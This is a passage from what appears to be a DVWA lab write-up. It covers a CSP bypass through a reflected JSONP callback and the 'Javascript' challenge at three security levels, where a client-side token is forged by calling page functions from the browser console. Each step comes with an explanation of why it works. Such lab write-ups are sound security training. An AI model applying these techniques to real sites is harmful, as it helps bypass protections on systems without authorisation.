Explanation of why it worked: The application utilizes a JSONP endpoint (`source/jsonp.php`) to fetch data. This endpoint insecurely reflects the user-controlled `callback` parameter directly into its JavaScript response. Because this vulnerable endpoint is hosted on the local server, it is implicitly trusted by the `'self'` CSP directive. By manually constructing a script tag in the DOM that points to this endpoint with a malicious payload in the callback parameter, an attacker tricks the server into serving arbitrary JavaScript that the CSP authorizes and the browser executes.

Explanation of why the Medium level payload failed: The Medium payload simply copied the static, hardcoded nonce. The High level removes the nonce entirely and sets a strict 'self' policy, completely relying on JSONP endpoint requests for dynamic script execution.

## 14. Javascript

### Security Level: Low

Payload Used: Typed `success` into the input field and manually executed the `generate_token()` function via the browser console before submitting.

Result: Successfully bypassed the token validation by manually forcing the client-side JavaScript to generate a valid MD5 hash for the targeted phrase.

Screenshot:
<img width="1918" height="965" alt="Javascript Low" src="https://github.com/user-attachments/assets/3c409ce1-049a-4daa-bb36-385bc90e4e13" />






Explanation of why it worked: At the Low security level, the application relies entirely on client-side JavaScript to generate a security token (an MD5 hash of the submitted phrase). The developer failed to attach the `generate_token()` function to an `onChange` or `onSubmit` event listener, causing the form to submit stale tokens when the user changes the text. Because the security logic is completely exposed and executed within the browser's Document Object Model (DOM), an attacker can easily read the source code, type the desired input, and manually execute the token generation function via the developer console to satisfy the server's validation checks.

### Security Level: Medium

Payload Used: Typed `success` into the input field and manually executed the `do_elsesomething("XX")` function via the browser console before submitting.

Result: Successfully bypassed the token validation by manually forcing the external, obfuscated JavaScript to generate a valid security token for the targeted phrase.

Screenshot:
<img width="1918" height="962" alt="Javascript High" src="https://github.com/user-attachments/assets/7af1a5b6-5294-4393-87ca-99be17bb846c" />







Explanation of why it worked: The Medium security level attempts to secure the token generation by moving the logic into an external, minified JavaScript file (`medium.js`). This relies on "security through obscurity," which is an ineffective defense mechanism. Because the client's browser must still download and execute the script to function, an attacker can easily locate the file, reverse-engineer the string manipulation logic, and manually execute the exposed `do_elsesomething()` function from the developer console to generate a valid token for any arbitrary input.

Explanation of why the Low level payload failed: The Low payload manually called generate_token(), which was easily visible in the HTML source. The Medium level hides the token generation logic inside an external, minified JavaScript file and renames the functions to obfuscate the process.

### Security Level: High

Payload Used: Typed `success` into the input field and manually executed `token_part_1("success", true)` and `token_part_2("XX")` via the browser console before submitting.

Result: Successfully bypassed the token validation by interacting directly with the obfuscated client-side functions loaded into the browser's memory.

Screenshot:
<img width="1918" height="973" alt="Javascript Actual High" src="https://github.com/user-attachments/assets/77c68b21-6342-4699-910e-2fd2d2b39cbe" />








Explanation of why it worked: Obfuscation provides no actual security ("security through obscurity"). Because the logic must run on the client side, the browser automatically unpacks the code and loads the functions into the global namespace. An attacker does not need to reverse-engineer the complex math or hashing algorithms; they can simply open the developer tools and manually call the exposed `token_part` functions in the correct sequence to generate a valid token for any arbitrary input.

Explanation of why the Medium level payload failed: The Medium payload successfully executed the newly discovered external function. The High level utilizes a heavy JavaScript packer to turn the code into unreadable gibberish and splits the token generation into multiple dependent steps to confuse the attacker.





